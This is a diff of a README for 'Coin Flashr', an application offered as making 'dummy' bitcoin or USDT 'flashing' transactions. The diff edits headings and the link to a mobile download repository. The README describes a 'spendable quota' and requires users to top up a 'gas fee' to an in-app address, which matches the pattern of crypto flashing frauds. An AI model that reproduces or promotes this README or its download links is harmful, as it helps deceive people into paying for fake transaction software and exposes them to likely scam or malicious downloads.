@@ -11,11 +11,11 @@ Coin Flashr is a software application that lets users perform dummy transactions
 When you gain app access, you'll have a limited spendable quota of either bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.
 
 ## Prerequisites
-This application requires [Node.js](https://nodejs.org) to run.This is the
+This application requires [Node.js](https://nodejs.org) to run.
 
-### Android/iOS
+### Android/IOS
 
-Click [here](https://github.com/usdt-flashing/mobile-release) to visit the mobile repository.
+Click [here](https://github.com/bitcoin-flashing-software/mobile-release) to visit the mobile repository.
 
 ### Windows
 
